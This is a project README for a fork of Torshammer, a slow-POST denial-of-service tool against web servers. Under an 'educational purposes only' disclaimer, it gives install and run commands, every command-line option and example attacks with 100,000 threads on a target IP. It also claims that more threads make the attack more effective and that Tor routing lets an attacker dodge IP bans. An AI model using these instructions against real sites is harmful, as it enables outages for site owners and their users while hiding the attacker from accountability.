# Use for educational purposes ONLY

## This is a maintained fork of Torshammer
- It works with the new TOR port 9050.
- Python 3.x version compatible.
  - If you need python 2.x version, please use [Karlheinzniebuhr's torshammer](https://github.com/Karlheinzniebuhr/torshammer)


## TORS HAMMER HOW TO

### Installation

Clone source code

```console
git clone https://github.com/kucingbasah737/kb737-torshammer
cd kb737-torshammer
```
### Usage

```console
python torshammer.py
```

or:
```console
python3 torshamer.py
```

```
./torshammer.py -t <target> [-r <threads>] [-p <port>] [-T] [-S <sockshost> -P <socksport>] [-i <seconds>] [-s <seconds>] [-h]
 -t|--target <Hostname|IP>
 -r|--threads <Number of threads> Defaults to 256
 -p|--port <Web Server Port> Defaults to 80
 -T|--tor Enable anonymising through tor on 127.0.0.1:9050
 -S|--sockshost <SOCKS host addrees> eg: 127.0.0.1
 -P|--socksport <SOCSS host port> Defaults to 1080
 -i|--max-delay <max seconds beetwen packets in float> Defaults to 3.0
 -s|--pre-sleep-on-thread-start <max seconds beetween starting threads> Default to none
 -h|--help Shows this help
```
You should now see a terminal-based GUI interface.
**Tor'shammer interface has it's own basic help menu that tells you how to run the script according to your target.**

Example usage:
```console
python torshammer.py -t 192.168.1.100 -r 100000 -T
```

```console
python torshammer.py -t 192.168.1.100 -r 100000 -S 127.0.0.1 -P 8080
```

```console
python torshammer.py -t 192.168.1.100 -r 100000 -i 3.0 -s 1.0
```

- The larger the thread count, the more efficient and effective the attack!!
- -T adds the Tor function which provides security, as well, as providing a new identity in case the site is
programmed to ban IP addresses which leave an open connection for "x" amount of time. Tor'shammer's method of
combining this is clever and effective, making it the powerful tool it is. However, Tor'shammer is only effective to
apache servers which do not run nginx.

### Alternatives
- Another python3 working for is from [fckwarship](https://github.com/fckwarship/torshammer).
